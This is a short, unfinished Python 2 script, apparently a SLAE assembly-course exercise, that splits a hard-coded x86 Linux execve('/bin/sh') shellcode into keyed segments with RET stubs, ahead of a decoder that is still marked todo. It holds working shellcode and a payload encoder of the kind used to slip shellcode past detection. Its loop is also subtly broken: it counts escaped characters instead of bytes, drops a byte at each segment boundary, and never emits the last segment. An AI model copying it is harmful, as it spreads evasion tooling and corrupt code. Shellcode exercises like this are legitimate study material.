#!/usr/bin/python
# Python Custom Incremental Encoder
# Author:   SLAE-935

# Todo: Implement Incremental Encoder
import random

shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
segment_size = 32

encoded = ""
encoded2 = ""
current_segment_encoded = ""
current_segment_encoded2 = ""

current_segment_key = 0x01 # todo: asm
segment_jump_back_stub = 0xC3 # RET (pops latest 4bytes from the stack and put them in EIP returning to get_pc)

print 'Encoded shellcode ...'

for x in bytearray(shellcode):
    if len(bytearray(current_segment_encoded)) == segment_size: # Todo: handle 8bytes padding
        current_segment_encoded += '\\x%02x' % current_segment_key + '\\x%02x' % segment_jump_back_stub
        current_segment_encoded2 += '0x%02x,' % current_segment_key + '0x%02x,' % segment_jump_back_stub
        encoded += current_segment_encoded
        encoded2 += current_segment_encoded2
        current_segment_encoded = current_segment_encoded2 = ""
        current_segment_key += 1
    else:
        current_segment_encoded += '\\x'
        current_segment_encoded += '%02x' % x       
        current_segment_encoded2 += '0x'
        current_segment_encoded2 += '%02x,' % x

print 'Encoded Shellcode:'
print encoded
print encoded2

print 'Generating assembly for decoder'



print 'Len: %d' % len(bytearray(shellcode))